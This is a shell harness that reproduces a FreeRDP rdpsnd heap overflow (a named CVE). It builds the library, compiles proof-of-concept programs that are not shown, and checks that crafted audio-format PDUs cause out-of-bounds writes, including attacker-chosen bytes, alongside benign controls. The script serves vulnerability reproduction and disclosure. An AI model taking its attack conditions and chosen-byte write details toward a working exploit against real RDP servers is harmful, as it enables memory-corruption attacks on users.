#!/bin/sh
# Real-library replay for FreeRDP rdpsnd select_format() wraparound
# (GHSA-3m9q-g533-rqjq / CVE-2026-114045).
#
# Provisions FreeRDP 3.32.0 under $WORK (default /tmp/fr-wake2), builds the
# three libraries needed by the PoCs with gcc ASan/UBSan and again without
# sanitizers (the chosen-byte PoC must survive two OOB writes), compiles the
# PoCs and controls, and checks the observed output.
#
# IN-PROCESS: no live RDP session, channel transport or auth gate. The
# PocRdpsndWire and PocRdpsndChosenBytes cases drive the real
# rdpsnd_server_recv_formats() parser with a crafted SNDC_FORMATS PDU;
# PocRdpsndChannelDispatch additionally drives the real exported
# rdpsnd_server_handle_messages() framing/dispatcher with a stub WTS read
# callback. PocRdpsndRealWts replaces that stub with FreeRDP's real WTS reader
# and uses the real shadow Activated callback to select the format; it records
# the codec-gating precondition. Only source-built loopback-local code is used.
set -eu

HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
WORK=${FREERDP_WORK:-/tmp/fr-wake2}
SRC=$WORK/src3320
BUILD=$WORK/build3320
PLAIN=$WORK/build3320_plain
TAG=3.32.0
CLONE_URL=${FREERDP_CLONE_URL:-https://github.com/FreeRDP/FreeRDP.git}
ASAN='detect_leaks=0:allocator_may_return_null=1:abort_on_error=0'
# Without these, CMake aborts on missing optional dependencies on a fresh host.
FEATURE_FLAGS="-DWITH_SERVER=ON -DWITH_CLIENT=OFF -DWITH_SERVER_CHANNELS=ON -DWITH_KRB5=OFF -DWITH_PKCS11=OFF -DWITH_SMARTCARD_EMULATE=OFF -DWITH_FFMPEG=OFF -DWITH_SWSCALE=OFF -DCHANNEL_URBDRC=OFF -DWITH_CUPS=OFF -DWITH_FUSE=OFF"

fail() { echo "FAIL: $*" >&2; exit 1; }

if [ ! -d "$SRC/.git" ]; then
    mkdir -p "$WORK"
    git clone --depth 1 --branch "$TAG" "$CLONE_URL" "$SRC"
fi

if [ ! -f "$BUILD/server/common/libfreerdp-server3.so" ]; then
    cmake -S "$SRC" -B "$BUILD" -GNinja \
        -DCMAKE_BUILD_TYPE=Debug \
        -DCMAKE_C_FLAGS='-fsanitize=address,undefined -fno-omit-frame-pointer -g -O1' \
        $FEATURE_FLAGS
    ninja -C "$BUILD" -j16 libwinpr3.so libfreerdp3.so libfreerdp-server3.so
fi

if [ ! -f "$PLAIN/server/common/libfreerdp-server3.so" ]; then
    cmake -S "$SRC" -B "$PLAIN" -GNinja -DCMAKE_BUILD_TYPE=Debug \
        -DCMAKE_C_FLAGS='' $FEATURE_FLAGS
    ninja -C "$PLAIN" -j16 libwinpr3.so libfreerdp3.so libfreerdp-server3.so
fi

compile() { # src out [builddir]
    BD=${3:-$BUILD}
    gcc -g -O1 -fno-omit-frame-pointer -fsanitize=address,undefined -std=gnu11 \
        -Wno-deprecated-declarations \
        -I"$SRC/winpr/include" -I"$BD/winpr/include" -I"$BD" \
        -I"$BD/include" -I"$SRC/include" -I"$SRC/channels/rdpsnd/server" \
        -I"$SRC/channels/rdpsnd/common" \
        "$1" -o "$2" \
        -L"$BD/libfreerdp" -L"$BD/winpr/libwinpr" -L"$BD/server/common" \
        -Wl,-rpath,"$BD/libfreerdp:$BD/winpr/libwinpr:$BD/server/common" \
        -lfreerdp3 -lwinpr3 -lfreerdp-server3 -lpthread -lm -ldl
}

compile_plain() { # src out
    gcc -g -O1 -fno-omit-frame-pointer -std=gnu11 -Wno-deprecated-declarations \
        -I"$SRC/winpr/include" -I"$PLAIN/winpr/include" -I"$PLAIN" \
        -I"$PLAIN/include" -I"$SRC/include" -I"$SRC/channels/rdpsnd/server" \
        -I"$SRC/channels/rdpsnd/common" \
        "$1" -o "$2" \
        -L"$PLAIN/libfreerdp" -L"$PLAIN/winpr/libwinpr" -L"$PLAIN/server/common" \
        -Wl,-rpath,"$PLAIN/libfreerdp:$PLAIN/winpr/libwinpr:$PLAIN/server/common" \
        -lfreerdp3 -lwinpr3 -lfreerdp-server3 -lpthread -lm -ldl
}

compile "$HERE/PocRdpsndOverflow.c" "$WORK/PocRdpsndOverflow" || fail 'PoC compile'
compile "$HERE/PocPcmControl.c" "$WORK/PocPcmControl" || fail 'control compile'

# Rung 1/3 on the real library.
ASAN_OPTIONS="$ASAN" timeout 60 "$WORK/PocRdpsndOverflow" > "$WORK/poc.out" 2>&1 || true
grep -q 'out_frames=0xfffffffffffffff0' "$WORK/poc.out" || fail 'wrapped out_frames missing'
grep -q 'realloc failed' "$WORK/poc.out" || fail 'failed realloc missing'
grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow' "$WORK/poc.out" || fail 'no ASan heap overflow'
grep -q 'WRITE of size 16384' "$WORK/poc.out" || fail 'wrong write size'
grep -q '0 bytes after 8820-byte region' "$WORK/poc.out" || fail 'wrong region size'
grep -q 'rdpsnd_server_send_samples' "$WORK/poc.out" || fail 'wrong write frame'

# Benign control must stay clean.
ASAN_OPTIONS="$ASAN" timeout 60 "$WORK/PocPcmControl" > "$WORK/pcm.out" 2>&1
grep -q 'PCM control SendSamples done' "$WORK/pcm.out" || fail 'PCM control did not finish'
if grep -q 'AddressSanitizer' "$WORK/pcm.out"; then fail 'PCM control hit ASan'; fi

# Real SNDC_FORMATS parse path: the parser admits the malicious record.
compile "$HERE/PocRdpsndWire.c" "$WORK/PocRdpsndWire" || fail 'wire PoC compile'
ASAN_OPTIONS="$ASAN" timeout 60 "$WORK/PocRdpsndWire" > "$WORK/wire.out" 2>&1 || true
grep -q 'recv_formats rc=0 nformats=2' "$WORK/wire.out" || fail 'wire parse rejected the PDUs'
grep -q 'parsed\[1\]: tag=17 channels=2 blockalign=4 cbsize=2' "$WORK/wire.out" || fail 'parsed record mismatch'
grep -q 'out_frames=0xfffffffffffffff0' "$WORK/wire.out" || fail 'wire path did not wrap'
grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow' "$WORK/wire.out" || fail 'wire path no ASan overflow'

# Rung 4 on real bytes through the real SNDC_FORMATS parser. This PoC is not
# ASan-instrumented: ASan aborts on the first OOB write, before the second call.
# It places client-chosen 0xDE / 0xAD at OOB offsets 8820 / 21384.
compile_plain "$HERE/PocRdpsndChosenBytes.c" \
    "$WORK/PocRdpsndChosenBytes" || fail 'chosen-byte PoC compile'
timeout 60 "$WORK/PocRdpsndChosenBytes" > "$WORK/chosen.out" 2>&1 || \
    fail 'chosen-byte PoC failed'
grep -q 'recv_formats rc=0 nformats=2' "$WORK/chosen.out" || \
    fail 'chosen-byte PoC: wire parse'
grep -q 'out_frames=0xfffffffffffffff0 out_buffer_size=8820' "$WORK/chosen.out" || \
    fail 'chosen-byte PoC: wrap'
grep -q 'readback offset 8820  = de' "$WORK/chosen.out" || \
    fail 'chosen-byte PoC: marker 1'
grep -q 'readback offset 21384 = ad' "$WORK/chosen.out" || \
    fail 'chosen-byte PoC: marker 2'
grep -q '\[rung4\] RESULT=PASS' "$WORK/chosen.out" || fail 'chosen-byte PoC: result'

# Real exported channel dispatcher: a fully framed SNDC_FORMATS PDU is read in
# 20-byte chunks through a stub WTS callback, reassembled by the real
# rdpsnd_server_handle_messages() and dispatched to the real parser. The WTS
# read callback is a stub; no RDP session, network path or auth gate.
compile "$HERE/PocRdpsndChannelDispatch.c" \
    "$WORK/PocRdpsndChannelDispatchAsan" || fail 'dispatch PoC ASan compile'
ASAN_OPTIONS="$ASAN" timeout 60 "$WORK/PocRdpsndChannelDispatchAsan" \
    > "$WORK/dispatch_asan.out" 2>&1 || true
grep -q 'handle_header rc=0 handle_body rc=0 reads=4 msgType=7 nformats=2' \
    "$WORK/dispatch_asan.out" || fail 'dispatch ASan: header/body framing'
grep -q 'parsed\[1\]: tag=17 channels=2 blockalign=4 cbsize=2' \
    "$WORK/dispatch_asan.out" || fail 'dispatch ASan: parsed record'
grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow' "$WORK/dispatch_asan.out" ||
    fail 'dispatch ASan: no overflow'
grep -q 'WRITE of size 16384' "$WORK/dispatch_asan.out" ||
    fail 'dispatch ASan: wrong write size'
grep -q '0 bytes after 8820-byte region' "$WORK/dispatch_asan.out" ||
    fail 'dispatch ASan: wrong region size'
grep -q 'rdpsnd_server_send_samples' "$WORK/dispatch_asan.out" ||
    fail 'dispatch ASan: wrong write frame'

compile_plain "$HERE/PocRdpsndChannelDispatch.c" \
    "$WORK/PocRdpsndChannelDispatch" || fail 'dispatch PoC plain compile'
timeout 60 "$WORK/PocRdpsndChannelDispatch" > "$WORK/dispatch_chosen.out" 2>&1 ||
    fail 'dispatch chosen-byte PoC failed'
grep -q 'handle_header rc=0 handle_body rc=0 reads=4 msgType=7 nformats=2' \
    "$WORK/dispatch_chosen.out" || fail 'dispatch chosen: framing'
grep -q 'readback offset 8819=11 offset 8820=de offset 21384=ad' \
    "$WORK/dispatch_chosen.out" || fail 'dispatch chosen: markers'
grep -q 'out_pending_frames=8192 out_frames=0xfffffffffffffff0' \
    "$WORK/dispatch_chosen.out" || fail 'dispatch chosen: wrapped state'
grep -q '\[dispatch\] mode=dvi chosen RESULT=PASS' "$WORK/dispatch_chosen.out" ||
    fail 'dispatch chosen: result'

timeout 60 "$WORK/PocRdpsndChannelDispatch" benign > "$WORK/dispatch_benign.out" 2>&1 ||
    fail 'dispatch benign control failed'
grep -q 'handle_header rc=0 handle_body rc=0 reads=3 msgType=7 nformats=1' \
    "$WORK/dispatch_benign.out" || fail 'dispatch benign: framing'
grep -q 'out_frames=0x000000000000089d' "$WORK/dispatch_benign.out" ||
    fail 'dispatch benign: wrapped state unexpectedly'
grep -q '\[dispatch\] mode=benign benign RESULT=PASS' "$WORK/dispatch_benign.out" ||
    fail 'dispatch benign: result'


# WAVE_FORMAT_ADPCM nBlockAlign=8, nChannels=2: a tag the stock shadow
# server's default format list offers, so Activated can select it without a
# DVI_ADPCM precondition. Same real dispatcher and WTS stub as above.
ASAN_OPTIONS="$ASAN" timeout 60 "$WORK/PocRdpsndChannelDispatchAsan" adpcm \
    > "$WORK/dispatch_adpcm_asan.out" 2>&1 || true
grep -q 'parsed\[1\]: tag=2 channels=2 blockalign=8 cbsize=0' \
    "$WORK/dispatch_adpcm_asan.out" || fail 'dispatch ADPCM: parsed record'
grep -q 'out_frames=0xfffffffffffffffc' "$WORK/dispatch_adpcm_asan.out" ||
    fail 'dispatch ADPCM: wrapped frames'
grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow' \
    "$WORK/dispatch_adpcm_asan.out" || fail 'dispatch ADPCM: no overflow'
grep -q 'WRITE of size 16384' "$WORK/dispatch_adpcm_asan.out" ||
    fail 'dispatch ADPCM: wrong write size'
grep -q '0 bytes after 8820-byte region' "$WORK/dispatch_adpcm_asan.out" ||
    fail 'dispatch ADPCM: wrong region size'
grep -q 'rdpsnd_server_send_samples' "$WORK/dispatch_adpcm_asan.out" ||
    fail 'dispatch ADPCM: wrong write frame'

timeout 60 "$WORK/PocRdpsndChannelDispatch" adpcm \
    > "$WORK/dispatch_adpcm.out" 2>&1 || fail 'dispatch ADPCM PoC failed'
grep -q 'parsed\[1\]: tag=2 channels=2 blockalign=8 cbsize=0' \
    "$WORK/dispatch_adpcm.out" || fail 'dispatch ADPCM plain: parsed record'
grep -q 'out_frames=0xfffffffffffffffc out_buffer_size=8820' \
    "$WORK/dispatch_adpcm.out" || fail 'dispatch ADPCM plain: wrapped state'
grep -q 'readback offset 8819=11 offset 8820=de offset 21384=ad' \
    "$WORK/dispatch_adpcm.out" || fail 'dispatch ADPCM plain: markers'
grep -q '\[dispatch\] mode=adpcm chosen RESULT=PASS' \
    "$WORK/dispatch_adpcm.out" || fail 'dispatch ADPCM plain: result'


# Real WTS read path: PocRdpsndRealWts registers FreeRDP's own WtsApi table,
# so handle_messages() reads from a real wMessageQueue through libfreerdp's
# FreeRDP_WTSVirtualChannelRead, and the shadow Activated callback selects the
# format (no manual SelectFormat). Two framed PDUs: PCM, then the malicious
# record. The queue is fed in-process: no session, network path or auth gate.
#
# Codec-gating precondition (measured): server_rdpsnd_get_formats() filters
# through freerdp_dsp_supports_format(); this build (FFMPEG off) returns only
# PCM, so real activation rejects both wrap-capable tags. That is the dvi and
# adpcm negative controls below. The "subsystem" mode supplies an ADPCM server
# record the way subsystem->rdpsndFormats may, making the same real activation
# path select the vulnerable client record.
compile "$HERE/PocRdpsndRealWts.c" \
    "$WORK/PocRdpsndRealWtsAsan" || fail 'real-WTS PoC ASan compile'
ASAN_OPTIONS="$ASAN" timeout 60 "$WORK/PocRdpsndRealWtsAsan" subsystem \
    > "$WORK/realwts_asan_subsystem.out" 2>&1 || true
grep -q 'server format source: harness-supplied subsystem table' \
    "$WORK/realwts_asan_subsystem.out" || fail 'real-WTS ASan: format source'
grep -q 'real server formats: 1 2' "$WORK/realwts_asan_subsystem.out" ||
    fail 'real-WTS ASan: server formats'
grep -q 'shadow selected client format 0 rc=12' \
    "$WORK/realwts_asan_subsystem.out" || fail 'real-WTS ASan: failed realloc'
grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow' \
    "$WORK/realwts_asan_subsystem.out" || fail 'real-WTS ASan: no overflow'
grep -q 'WRITE of size 16384' "$WORK/realwts_asan_subsystem.out" ||
    fail 'real-WTS ASan: wrong write size'
grep -q '0 bytes after 8820-byte region' "$WORK/realwts_asan_subsystem.out" ||
    fail 'real-WTS ASan: wrong region size'
grep -q 'rdpsnd_server_send_samples' "$WORK/realwts_asan_subsystem.out" ||
    fail 'real-WTS ASan: wrong write frame'

compile_plain "$HERE/PocRdpsndRealWts.c" \
    "$WORK/PocRdpsndRealWts" || fail 'real-WTS PoC plain compile'
timeout 60 "$WORK/PocRdpsndRealWts" subsystem \
    > "$WORK/realwts_subsystem.out" 2>&1 || fail 'real-WTS subsystem PoC failed'
grep -q 'real-WTS reads rc=0,0,0,0 selected=0 nformats=1 tag=2 ch=2 align=8' \
    "$WORK/realwts_subsystem.out" || fail 'real-WTS subsystem: dispatch'
grep -q 'out_buffer_size after PDU1=8820 final out_frames=0xfffffffffffffffc' \
    "$WORK/realwts_subsystem.out" || fail 'real-WTS subsystem: wrapped state'
grep -q 'readback offset 8819=11 offset 8820=de offset 21384=ad out_pending_frames=8192' \
    "$WORK/realwts_subsystem.out" || fail 'real-WTS subsystem: markers'
grep -q '\[realwts\] mode=subsystem chosen RESULT=PASS' \
    "$WORK/realwts_subsystem.out" || fail 'real-WTS subsystem: result'

timeout 60 "$WORK/PocRdpsndRealWts" benign \
    > "$WORK/realwts_benign.out" 2>&1 || fail 'real-WTS benign control failed'
grep -q 'server format source: real server_rdpsnd_get_formats()' \
    "$WORK/realwts_benign.out" || fail 'real-WTS benign: format source'
grep -q 'out_buffer_size after PDU1=8820 final out_frames=0x000000000000089d' \
    "$WORK/realwts_benign.out" || fail 'real-WTS benign: no wrap'
grep -q '\[realwts\] mode=benign benign RESULT=PASS' \
    "$WORK/realwts_benign.out" || fail 'real-WTS benign: result'

for m in dvi adpcm; do
    timeout 60 "$WORK/PocRdpsndRealWts" "$m" \
        > "$WORK/realwts_${m}_rejected.out" 2>&1 || true
    grep -q 'server format source: real server_rdpsnd_get_formats()' \
        "$WORK/realwts_${m}_rejected.out" || fail "real-WTS $m: format source"
    grep -q 'real server formats: 1' "$WORK/realwts_${m}_rejected.out" ||
        fail "real-WTS $m: expected PCM-only list"
    grep -q '\[activate\] no compatible server format' \
        "$WORK/realwts_${m}_rejected.out" || fail "real-WTS $m: not rejected"
    grep -q "\[realwts\] mode=$m chosen RESULT=FAIL" \
        "$WORK/realwts_${m}_rejected.out" || fail "real-WTS $m: expected negative"
done

echo 'ALL REAL-LIBRARY CHECKS PASS'
echo "vulnerable: $WORK/poc.out"
echo "control:    $WORK/pcm.out"
echo "wire:       $WORK/wire.out"
echo "chosen:     $WORK/chosen.out"
echo "dispatch asan:        $WORK/dispatch_asan.out"
echo "dispatch chosen:      $WORK/dispatch_chosen.out"
echo "dispatch benign:      $WORK/dispatch_benign.out"
echo "dispatch adpcm asan:  $WORK/dispatch_adpcm_asan.out"
echo "dispatch adpcm plain: $WORK/dispatch_adpcm.out"
